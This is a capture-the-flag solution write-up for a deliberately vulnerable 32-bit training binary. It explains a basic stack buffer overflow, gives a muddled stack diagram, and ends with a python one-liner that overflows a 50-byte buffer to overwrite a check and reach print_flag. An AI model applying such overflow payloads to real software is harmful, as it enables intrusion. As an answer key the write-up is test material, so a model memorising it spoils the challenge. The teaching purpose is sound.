## Solution

It is a basic stack overflow of a variable. The program is compiled without any protections in 32 bits.
The aim for the player, logged into pwn3r, is to exploit a basic stack buffer overflow.
In order to gain access to the flag owned by pwn3r-cracked, the player has to call `print_flag`.
The player may use python3, gdb, build-essentials tools on the container to achieve this and work in /tmp to avoid spoilers:

```bash
cd $(mktemp -d)
```

------------- 0xbf???f
| EBP (top) |
|-----------|
| EIP (ret) |  <- printf_flag called when the check is well changed
|-----------|
| flag[100] |
|-----------|            +
| EIP (ret) |  <- main   |
|-----------|            |
| EBP (top )|            -
|-----------|
|flag (4 b.)|  <- 50+4 bytes to overflow the check
|-----------|
|  buf[50]  |
|-----------| 0xbf???0
  ESP (bottom)


We can put `fgets(buf, 0x50, stdin)'` = 80 chars in `buf`. From 50 chars, flag is achieved.

Assuming 0x42=B in ascii, we have:

```bash
python3 -c 'import sys;sys.stdout.write("A"*50+"B"*4)' | ./starter
```

